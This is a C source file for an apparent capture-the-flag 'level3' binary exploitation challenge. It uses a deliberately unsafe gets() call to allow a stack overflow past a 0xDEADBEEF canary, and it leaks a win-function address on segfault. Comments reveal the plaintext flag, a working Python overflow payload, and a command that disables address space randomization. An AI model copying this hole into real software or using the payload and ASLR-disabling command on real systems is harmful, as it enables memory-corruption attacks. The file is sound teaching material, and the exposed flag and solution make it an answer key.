#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#define debug 0

struct data {
    char yourinput[5];
    int birdy;
};

int check = 0;

char key[] = "MEWK";
void * safe_return;

// char flag[] = "s00ky_ctf{y00_h4VE_70_kN0W_wHeRE_70_g0_70_ge7_7H3R3}";
// python3 -c 'import sys; import struct; val = struct.pack("I", 0xdeadbeef); rVal = struct.pack("I", 0x555552a4); rVal2 = struct.pack("I", 0x00005555); sys.stdout.buffer.write(b"A" * 8 + val + b"A" * 168 + rVal + rVal2)' | ./level3


//Turn off adress space randmoization
// echo 0 > /proc/sys/kernel/randomize_va_space


char flag[] = {0x3a,0x71,0x63,0x2c,0x79,0x16,0x22,0x27,0x21,0x7b,0x30,0x71,0x63,0x18,0x68,0x7d,0x17,0x16,0x18,0x37,0x79,0x1e,0x38,0x9,0x30,0x1e,0x1e,0x24,0xf,0x65,0x1b,0x4,0xc,0x70,0x30,0x16,0x26,0x63,0x18,0x37,0x79,0x1e,0x34,0x22,0x37,0x16,0x76,0x1b,0x74,0x52,0x7a,0x3c,0x53,0x47};


void give_flag(char toPrint[], int size){

    if(! check) exit(0);


    puts("\n\n");



    int i;

    printf("check is %d\n", check);

    for(i = 0; i < size + 1; i++){
        char temp = 0;
        if(! (i%5 == 4) )
            temp = (char) check;
        if (debug) printf("%c", key[i % sizeof(key)] + check);
        toPrint[i] = toPrint[i] ^ (key[i % sizeof(key)] - temp);
        if (0) printf("0x%x,", toPrint[i]);
    }

    puts("\n\n");


}

void flaggify(){

    puts("well done\n");


    give_flag(flag, sizeof(flag));

    puts(flag);

    exit(1);


}

void segfault_sigaction(int signal, siginfo_t *si, void *arg)
{
    printf("Caught segfault at address %p\n", si->si_addr);
    printf("You seem to be struggling\nHere's a pointer that you may want to check it out: %.16p\n ", flaggify);
    
//     void (*fun_ptr)(int) = &flaggify;
//     unsigned char *cp = (unsigned char*)&flaggify;

//     int i;

//    for(i=0;i < 8; i++) {
//       printf("[%08x]", cp[i]);
//    }
    exit(0);
}

int main(void) {
    struct sigaction sa;

    safe_return =  __builtin_return_address(0);

    memset(&sa, 0, sizeof(struct sigaction));
    sigemptyset(&sa.sa_mask);
    sa.sa_sigaction = segfault_sigaction;
    sa.sa_flags   = SA_SIGINFO;

    sigaction(SIGSEGV, &sa, NULL);


    struct data data = {
        .yourinput = { 0 },
        .birdy = 0xDEADBEEF,
    };


    printf("Here's my favorite bird, what do you think his name is:\n");
    gets((char*) &data.yourinput);


   

    if (data.birdy != 0xDEADBEEF && ! debug) {
        printf("You killed my birdy, it was %p but you killed him so now he's %p \nI will make you pay for that\n",  0xDEADBEEF, data.birdy);
        if ( ! debug) exit(1);
    }


    if (debug) printf("original return: %p\n now going to %p\n", safe_return, __builtin_return_address(0));

    if (safe_return != (char *) __builtin_return_address(0)){
        printf("Oh my birdy likes you: %p thinks you're a nice person so you can stay for now\n", data.birdy);

        printf("Here let me show you to %p\n", __builtin_return_address(0));
    } else {
         puts("Wrong!!!!!! \nLeave.\n");
    }

    


    check = 4;

    if (debug) flaggify();

    return 0;
}